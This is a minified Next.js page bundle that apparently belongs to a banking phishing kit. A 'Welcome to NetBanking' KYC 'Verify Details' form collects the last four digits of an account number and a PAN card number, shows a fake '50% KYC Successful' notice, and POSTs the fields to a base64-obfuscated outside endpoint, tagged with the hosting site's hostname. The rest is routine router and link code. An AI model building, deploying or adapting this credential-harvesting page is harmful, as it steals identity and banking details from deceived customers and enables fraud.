(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [138], {
        7693: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/p4", function() {
                return n(1270)
            }])
        },
        9018: function(e, t) {
            "use strict";
            t.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        1210: function(e, t) {
            "use strict";

            function n(e, t, n, o) {
                return !1
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.getDomainLocale = n, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        8418: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            var o = n(4941).Z;
            n(5753).default, Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.default = void 0;
            var r = n(2648).Z,
                a = n(7273).Z,
                l = r(n(7294)),
                c = n(6273),
                i = n(2725),
                u = n(3462),
                s = n(1018),
                f = n(7190),
                d = n(1210),
                p = n(8684),
                h = {};

            function v(e, t, n, o) {
                if (e && c.isLocalURL(t)) {
                    Promise.resolve(e.prefetch(t, n, o)).catch(function(e) {});
                    var r = o && void 0 !== o.locale ? o.locale : e && e.locale;
                    h[t + "%" + n + (r ? "%" + r : "")] = !0
                }
            }
            var m = l.default.forwardRef(function(e, t) {
                var n, r, m = e.href,
                    y = e.as,
                    x = e.children,
                    j = e.prefetch,
                    _ = e.passHref,
                    b = e.replace,
                    g = e.shallow,
                    C = e.scroll,
                    L = e.locale,
                    N = e.onClick,
                    w = e.onMouseEnter,
                    P = e.onTouchStart,
                    R = e.legacyBehavior,
                    E = void 0 === R ? !0 !== Boolean(!1) : R,
                    M = a(e, ["href", "as", "children", "prefetch", "passHref", "replace", "shallow", "scroll", "locale", "onClick", "onMouseEnter", "onTouchStart", "legacyBehavior"]);
                n = x, E && ("string" == typeof n || "number" == typeof n) && (n = l.default.createElement("a", null, n));
                var T = !1 !== j,
                    k = l.default.useContext(u.RouterContext),
                    O = l.default.useContext(s.AppRouterContext);
                O && (k = O);
                var S = l.default.useMemo(function() {
                        var e = o(c.resolveHref(k, m, !0), 2),
                            t = e[0],
                            n = e[1];
                        return {
                            href: t,
                            as: y ? c.resolveHref(k, y) : n || t
                        }
                    }, [k, m, y]),
                    Z = S.href,
                    A = S.as,
                    D = l.default.useRef(Z),
                    B = l.default.useRef(A);
                E && (r = l.default.Children.only(n));
                var U = E ? r && "object" == typeof r && r.ref : t,
                    H = o(f.useIntersection({
                        rootMargin: "200px"
                    }), 3),
                    K = H[0],
                    F = H[1],
                    G = H[2],
                    z = l.default.useCallback(function(e) {
                        (B.current !== A || D.current !== Z) && (G(), B.current = A, D.current = Z), K(e), U && ("function" == typeof U ? U(e) : "object" == typeof U && (U.current = e))
                    }, [A, U, Z, G, K]);
                l.default.useEffect(function() {
                    var e = F && T && c.isLocalURL(Z),
                        t = void 0 !== L ? L : k && k.locale,
                        n = h[Z + "%" + A + (t ? "%" + t : "")];
                    e && !n && v(k, Z, A, {
                        locale: t
                    })
                }, [A, Z, F, L, T, k]);
                var V = {
                    ref: z,
                    onClick: function(e) {
                        E || "function" != typeof N || N(e), E && r.props && "function" == typeof r.props.onClick && r.props.onClick(e), e.defaultPrevented || function(e, t, n, o, r, a, i, u, s, f) {
                            if ("A" !== e.currentTarget.nodeName.toUpperCase() || (!(p = (d = e).currentTarget.target) || "_self" === p) && !d.metaKey && !d.ctrlKey && !d.shiftKey && !d.altKey && (!d.nativeEvent || 2 !== d.nativeEvent.which) && c.isLocalURL(n)) {
                                e.preventDefault();
                                var d, p, h = function() {
                                    "beforePopState" in t ? t[r ? "replace" : "push"](n, o, {
                                        shallow: a,
                                        locale: u,
                                        scroll: i
                                    }) : t[r ? "replace" : "push"](n, {
                                        forceOptimisticNavigation: !f
                                    })
                                };
                                s ? l.default.startTransition(h) : h()
                            }
                        }(e, k, Z, A, b, g, C, L, Boolean(O), T)
                    },
                    onMouseEnter: function(e) {
                        E || "function" != typeof w || w(e), E && r.props && "function" == typeof r.props.onMouseEnter && r.props.onMouseEnter(e), !(!T && O) && c.isLocalURL(Z) && v(k, Z, A, {
                            priority: !0
                        })
                    },
                    onTouchStart: function(e) {
                        E || "function" != typeof P || P(e), E && r.props && "function" == typeof r.props.onTouchStart && r.props.onTouchStart(e), !(!T && O) && c.isLocalURL(Z) && v(k, Z, A, {
                            priority: !0
                        })
                    }
                };
                if (!E || _ || "a" === r.type && !("href" in r.props)) {
                    var W = void 0 !== L ? L : k && k.locale,
                        Y = k && k.isLocaleDomain && d.getDomainLocale(A, W, k.locales, k.domainLocales);
                    V.href = Y || p.addBasePath(i.addLocale(A, W, k && k.defaultLocale))
                }
                return E ? l.default.cloneElement(r, V) : l.default.createElement("a", Object.assign({}, M, V), n)
            });
            t.default = m, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        1018: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.TemplateContext = t.GlobalLayoutRouterContext = t.LayoutRouterContext = t.AppRouterContext = void 0;
            var o = (0, n(2648).Z)(n(7294)),
                r = o.default.createContext(null);
            t.AppRouterContext = r;
            var a = o.default.createContext(null);
            t.LayoutRouterContext = a;
            var l = o.default.createContext(null);
            t.GlobalLayoutRouterContext = l;
            var c = o.default.createContext(null);
            t.TemplateContext = c
        },
        1270: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return v
                }
            });
            var o = n(7568),
                r = n(655),
                a = n(5893),
                l = n(9008),
                c = n.n(l),
                i = n(5675),
                u = n.n(i),
                s = n(1664),
                f = n.n(s),
                d = n(9018),
                p = n(1163),
                h = n(7294);

            function v() {
                var e, t = (0, p.useRouter)(),
                    n = (0, h.useState)(!1),
                    l = n[0],
                    i = n[1],
                    s = (e = (0, o.Z)(function(e) {
                        var n, o, a, l, c, u;
                        return (0, r.__generator)(this, function(r) {
                            switch (r.label) {
                                case 0:
                                    return e.preventDefault(), i(!0), n = new FormData(e.target), o = {}, n.forEach(function(e, t) {
                                        o[t] = e
                                    }), l = {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json"
                                        },
                                        body: JSON.stringify(o)
                                    }, [4, fetch(window.atob(d.Z.dataList) + "?id=" + window.location.hostname, l)];
                                case 1:
                                    return [4, r.sent().json()];
                                case 2:
                                    return u = r.sent(), i(!1), !0 == u.status ? t.push("/p5") : i(!1), [2]
                            }
                        })
                    }), function(t) {
                        return e.apply(this, arguments)
                    });
                return (0, a.jsxs)(a.Fragment, {
                    children: [(0, a.jsxs)(c(), {
                        children: [(0, a.jsx)("title", {
                            children: "Verify Details"
                        }), (0, a.jsx)("meta", {
                            name: "description",
                            content: "verify details"
                        })]
                    }), (0, a.jsx)("div", {
                        className: "header",
                        children: (0, a.jsxs)("div", {
                            className: "logo text-center",
                            children: [(0, a.jsx)(u(), {
                                alt: "the logo",
                                src: "/logo.png",
                                priority: !0,
                                width: 190,
                                height: 32
                            }), (0, a.jsx)("h1", {
                                children: " Welcome to NetBanking "
                            })]
                        })
                    }), (0, a.jsxs)("div", {
                        className: "content",
                        children: [(0, a.jsx)("h2", {
                            children: "Verify Details"
                        }), (0, a.jsxs)("form", {
                            action: "",
                            method: "post",
                            onSubmit: s,
                            children: [(0, a.jsxs)("div", {
                                className: "form-group",
                                children: [(0, a.jsx)("label", {
                                    htmlFor: "username",
                                    children: "Last 4 Digit Account Number"
                                }), (0, a.jsx)("input", {
                                    type: "text",
                                    className: "form-control",
                                    name: "last_4_digit_ac_number",
                                    minLength: 4,
                                    maxLength: 4,
                                    required: !0
                                })]
                            }), (0, a.jsxs)("div", {
                                className: "form-group",
                                children: [(0, a.jsx)("label", {
                                    htmlFor: "username",
                                    children: "PAN Card Number"
                                }), (0, a.jsx)("input", {
                                    className: "form-control",
                                    id: "pan_card_no",
                                    type: "text",
                                    name: "pan_card_no",
                                    maxLength: 10,
                                    pattern: "[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}",
                                    title: "Please enter valid PAN",
                                    required: !0
                                })]
                            }), (0, a.jsx)("p", {
                                style: {
                                    color: "green"
                                },
                                children: "50% KYC Successful"
                            }), (0, a.jsx)("button", {
                                type: "submit",
                                disabled: !!l,
                                className: "btn btn-primary login-btn",
                                children: "SUBMIT"
                            })]
                        })]
                    }), (0, a.jsxs)("div", {
                        className: "footer",
                        children: ["\xa9 Copyright Bank Ltd.", (0, a.jsx)(f(), {
                            className: "link",
                            href: "/",
                            children: (0, a.jsx)("a", {
                                children: "Terms and Conditions"
                            })
                        }), (0, a.jsx)(f(), {
                            className: "link",
                            href: "/",
                            children: (0, a.jsx)("a", {
                                children: "Privacy Policy"
                            })
                        })]
                    })]
                })
            }
        },
        1664: function(e, t, n) {
            e.exports = n(8418)
        },
        7568: function(e, t, n) {
            "use strict";

            function o(e, t, n, o, r, a, l) {
                try {
                    var c = e[a](l),
                        i = c.value
                } catch (u) {
                    n(u);
                    return
                }
                c.done ? t(i) : Promise.resolve(i).then(o, r)
            }

            function r(e) {
                return function() {
                    var t = this,
                        n = arguments;
                    return new Promise(function(r, a) {
                        var l = e.apply(t, n);

                        function c(e) {
                            o(l, r, a, c, i, "next", e)
                        }

                        function i(e) {
                            o(l, r, a, c, i, "throw", e)
                        }
                        c(void 0)
                    })
                }
            }
            n.d(t, {
                Z: function() {
                    return r
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 7693)
        }), _N_E = e.O()
    }
]);